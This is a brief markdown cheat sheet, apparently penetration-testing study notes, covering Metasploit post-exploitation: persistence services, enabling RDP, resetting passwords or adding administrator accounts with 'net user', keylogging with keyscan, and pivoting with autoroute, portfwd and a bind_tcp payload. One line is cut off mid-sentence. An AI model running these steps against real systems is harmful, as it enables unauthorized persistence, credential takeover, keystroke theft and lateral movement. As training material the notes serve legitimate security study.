<summary>Persistence</summary>
 
- Metasploit
  - search persistence module
  - Ex: exploit/windows/local/persistence_service
    - It will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.
- Enable RDP
  - with metasploit -> search enable_rdp (and set session)
    - Connect to victim from attacker
      - Note: you need username and password, if you don't have the password -> change it `net user <username> <new_pass>` (suspicious in a real environment) or crack NTLM...
      - Note 2: you can create a new account and add it to administrator group...

- Metasploit
  - `keyscan_start` : start keylogger
  - `keyscan_dump` : print captured strokes

<summary>Pivoting</summary>
 
- Metasploit
  - `ipconfig` -> find subnet (the host may be 
  - `run autoroute -s <subnet>` -> adds routes
  - `run autoroute -p` -> displays active routing table
  - auxiliary/scanner/portscan/tcp -> discover other systems
  - `portfwd add -l 1234 -p 80 -r <target_sys_2_ip>` -> forward remote port to local port
  - `portfwd list`
  - `nmap -sV -sS -p 1234 localhost`
  - since target_sys_2 does not have a route back to attacker_sys, use bind_shell payload -> windows/meterpreter/bind_tcp
